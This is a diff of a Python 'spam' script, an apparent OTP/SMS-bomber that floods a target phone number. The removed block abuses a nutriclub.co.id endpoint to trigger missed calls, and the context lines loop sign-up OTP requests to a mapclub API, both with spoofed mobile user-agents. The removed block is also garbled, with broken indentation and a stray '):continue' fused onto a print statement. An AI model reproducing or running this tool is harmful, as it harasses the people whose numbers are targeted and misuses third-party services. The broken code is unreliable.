@@ -34,31 +34,6 @@ class nyepam:
 		self._8,self._08,self._62=_8,_08,_62
 	def mulai(self):
 		try:
-			
-api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target
-
-headers = {
-"Host": "www.nutriclub.co.id",
-"content-length": "0","accept":
-"application/json, text/javascript, */*; q=0.01",
-"x-requested-with": "XMLHttpRequest",
-"save-data": "on",
-"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-"origin": "https://www.nutriclub.co.id",
-"sec-fetch-site": "same-origin",
-"sec-fetch-mode": "cors",
-"sec-fetch-dest": "empty","referer": "https://www.nutriclub.co.id/account/register",
-}
-
-
-respon = rek.post(api_url,headers).text
-
-status = json.loads(respon)["StatusMessage"]
-if status == "Request misscall berhasil":
-     print("\n {✓} Call to "+ target +" Berhasil \n")
-else:
-     print("\n {×} Spam sudah dilakukan 3x » Gagal \n"):continue
-				else:break
 			for x in range(5):
 				send=req.post("https://cmsapi.mapclub.com/api/signup-otp",data={"phone":self._08},headers={"Connection": "keep-alive","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
 				if "ok" in send:continue
